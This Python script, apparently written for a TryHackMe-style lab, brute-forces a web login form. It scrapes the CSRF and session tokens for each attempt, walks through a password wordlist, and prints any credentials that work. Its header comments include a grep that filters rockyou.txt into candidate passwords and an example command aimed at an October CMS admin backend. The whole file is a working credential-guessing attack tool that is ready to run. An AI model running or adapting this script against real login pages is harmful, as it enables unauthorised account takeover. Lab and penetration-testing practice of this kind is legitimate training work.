#!/usr/bin/python3

# cat /usr/share/wordlists/rockyou.txt | grep -E '^[pP][aA][sS]{2}[wW][oO][rR][dD][0-9][!@#$%^]$' > web-passwords.txt

# ./CSRFBrute.py --passwords web-passwords.txt --username admin --url http://thereserve-web.thm/october/index.php/backend/backend/auth/signin --message "did not match." --csrfname "_token" -v

import requests
import sys

# pip install bs4
from bs4 import BeautifulSoup
import argparse
import time



def getToken(url, csrfname, request):
  page = request.get(url)
  html_content = page.text
  soup = BeautifulSoup(html_content, features="lxml")
  
  try:
    token = soup.find('input', {"name":csrfname}).get("value")
  except AttributeError:
    print("[-] Wrong csrf token name")
    sys.exit(1)

  return token

def connect(username, password, url, csrfname, token, sessionfname, sessionKey, message, request):
  login_info = {
    #"useralias": username,
    "login": username,
    "password": password,
    #"submitLogin": "Connect",
    csrfname: token,
    sessionfname: sessionKey,
    "postback": 1
  }

  #print("=======" * 10)
  #print(login_info)
  #print( csrfname )
  #print( token )
  #print( sessionfname )
  #print( sessionKey )
  #print("=======" * 10)
  
  login_request = request.post(url, login_info)

  #print("=======" * 10)
  #print(login_request.text)
  #print("=======" * 10)

  if message not in login_request.text:
    print("=======" * 10)
    print(login_request.text)
    print("=======" * 10)
    return True

  else:
    return False

def tryLogin(username, password, url, csrfname, sessionfname, message, request):
  print("[+] Trying "+username+":"+password+" combination")
  print("[+] Retrieving CSRF token to submit the login form")

  token = getToken(url, csrfname, request)
  print("[+] Login token is : {0}".format(token))

  sessionKey = getToken(url, sessionfname, request)
  print("[+] Session token is : {0}".format(sessionKey))

  found = connect(username, password, url, csrfname, token, sessionfname, sessionKey, message, request)
  
  if (not found):
    print("[-] Wrong credentials")
    time.sleep(10)
    return False
  else:
    print("[+] Logged in sucessfully")
    return True

def printSuccess(username, password):
  print("-------------------------------------------------------------")
  print()
  print("[*] Credentials:\t"+username+":"+password)
  print()

if __name__ == '__main__':
  parser = argparse.ArgumentParser()
  
  # usernames can be one or more in a wordlist, but this two ptions are mutual exclusive  
  user_group = parser.add_mutually_exclusive_group(required=True)
  user_group.add_argument('-l', '--username', help='username for bruteforce login')
  user_group.add_argument('-L', '--usernames', help='usernames worldlist for bruteforce login')
  
  # passwords can be one or more in a wordlist, but this two ptions are mutual exclusive
  pass_group = parser.add_mutually_exclusive_group(required=True)
  pass_group.add_argument('-p', '--password', help='password for bruteforce login')
  pass_group.add_argument('-P', '--passwords', help='passwords wordlist for bruteforce login')

  # url
  parser.add_argument('-u', '--url', help='Url with login form', required=True)

  # csrf
  parser.add_argument('-c', '--csrfname', help='The csrf token input name on the login', required=True)

  # error message
  parser.add_argument('-m', '--message', help="The message of invalid cretials in the page after submit", required=True)

  # verbosity
  parser.add_argument('-v', '--verbosity', action='count', help='verbosity level')

  args = parser.parse_args()

  sessionfname = "_session_key"

  # one username and more passwords
  if (args.usernames == None and args.password == None):
    with open(args.passwords, 'rb') as passfile:
      for passwd in passfile.readlines():
        reqSess = requests.session()
        
        if (args.verbosity != None):
          found = tryLogin(args.username, passwd.decode().strip(), args.url, args.csrfname, sessionfname, args.message, reqSess)
          print()
        else:
          token = getToken(args.url, args.csrfname, reqSess)
          sessionKey = getToken(args.url, sessionfname, reqSess)
          found = connect(args.username, passwd.decode().strip(), args.url, args.csrfname, token, sessionfname, sessionKey, args.message, reqSess)

        if (found):
          printSuccess(args.username, passwd.decode().strip())
          sys.exit(1)
